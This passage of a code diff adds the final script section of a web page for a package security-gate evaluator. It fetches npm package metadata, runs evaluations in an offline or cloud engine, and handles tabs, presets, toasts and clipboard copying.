+        console.error(err);
+        showToast('Evaluation error occurred');
+      } finally {
+        runBtn.disabled = false;
+        runBtn.innerHTML = `
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>
+          <span>Evaluate Security Gate</span>
+        `;
+      }
+    }
+
+    // NPM Registry Fetch
+    async function fetchNpmRegistryPackage(pkgName) {
+      const fetchBtn = document.getElementById('fetch-registry-btn');
+      fetchBtn.disabled = true;
+      fetchBtn.textContent = 'Fetching...';
+
+      try {
+        const cleanName = pkgName.trim();
+        const url = `https://registry.npmjs.org/${encodeURIComponent(cleanName)}/latest`;
+        const resp = await fetch(url);
+        if (!resp.ok) throw new Error(`Package ${cleanName} not found on npm`);
+        const data = await resp.json();
+        
+        currentManifest = {
+          name: data.name,
+          version: data.version,
+          description: data.description || '',
+          scripts: data.scripts || {}
+        };
+
+        document.getElementById('manifest-json-input').value = JSON.stringify(currentManifest, null, 2);
+        showToast(`Fetched ${data.name}@${data.version}`);
+        runEvaluation();
+      } catch (err) {
+        console.error(err);
+        showToast(err.message || 'Failed to fetch package from registry');
+      } finally {
+        fetchBtn.disabled = false;
+        fetchBtn.textContent = 'Fetch';
+      }
+    }
+
+    // Toast feedback
+    function showToast(msg) {
+      const toast = document.getElementById('toast-notify');
+      toast.textContent = msg;
+      toast.classList.add('show');
+      setTimeout(() => {
+        toast.classList.remove('show');
+      }, 2400);
+    }
+
+    function copyText(text) {
+      navigator.clipboard.writeText(text).then(() => {
+        showToast('Copied to clipboard');
+      }).catch(() => {
+        showToast('Clipboard access denied');
+      });
+    }
+
+    // Initialize Event Listeners
+    document.addEventListener('DOMContentLoaded', () => {
+      // Load default preset
+      loadPreset('credential-theft');
+
+      // Preset Pills
+      document.querySelectorAll('.preset-btn[data-preset]').forEach(btn => {
+        btn.addEventListener('click', () => {
+          loadPreset(btn.dataset.preset);
+        });
+      });
+
+      // Tabs
+      document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+          document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+          btn.classList.add('active');
+          currentTab = btn.dataset.tab;
+
+          document.querySelectorAll('.tab-pane').forEach(p => p.style.display = 'none');
+          document.getElementById(`tab-pane-${currentTab}`).style.display = 'block';
+
+          runEvaluation();
+        });
+      });
+
+      // Engine Toggles
+      const btnSim = document.getElementById('btn-engine-sim');
+      const btnApi = document.getElementById('btn-engine-api');
+      const apiKeyBox = document.getElementById('api-key-box');
+      const apiKeyInput = document.getElementById('api-key-input');
+      const engineDescText = document.getElementById('engine-desc-text');
+
+      const savedKey = localStorage.getItem('typesafe_api_key') || '';
+      if (savedKey) apiKeyInput.value = savedKey;
+
+      btnSim.addEventListener('click', () => {
+        currentEngine = 'sim';
+        btnSim.classList.add('active');
+        btnApi.classList.remove('active');
+        apiKeyBox.classList.remove('visible');
+        engineDescText.textContent = 'Calibrated TypeSafe System One offline engine';
+        runEvaluation();
+      });
+
+      btnApi.addEventListener('click', () => {
+        currentEngine = 'api';
+        btnApi.classList.add('active');
+        btnSim.classList.remove('active');
+        apiKeyBox.classList.add('visible');
+        engineDescText.textContent = 'Live TypeSafe System One API (cloud)';
+        runEvaluation();
+      });
+
+      apiKeyInput.addEventListener('input', (e) => {
+        localStorage.setItem('typesafe_api_key', e.target.value.trim());
+      });
+
+      // Run button
+      document.getElementById('run-eval-btn').addEventListener('click', runEvaluation);
+
+      // Registry fetch
+      document.getElementById('fetch-registry-btn').addEventListener('click', () => {
+        const pkg = document.getElementById('registry-pkg-input').value;
+        if (pkg) fetchNpmRegistryPackage(pkg);
+      });
+
+      document.getElementById('registry-pkg-input').addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+          const pkg = e.target.value;
+          if (pkg) fetchNpmRegistryPackage(pkg);
+        }
+      });
+
+      // Copy buttons
+      document.getElementById('copy-cli-btn').addEventListener('click', () => {
+        copyText(document.getElementById('cli-cmd').textContent);
+      });
+
+      document.getElementById('copy-equiv-btn').addEventListener('click', () => {
+        copyText(document.getElementById('cli-equivalent-cmd').textContent);
+      });
+
+      document.getElementById('copy-json-btn').addEventListener('click', () => {
+        copyText(document.getElementById('json-output-box').textContent);
+      });
+    });
+  </script>
+</body>
+</html>
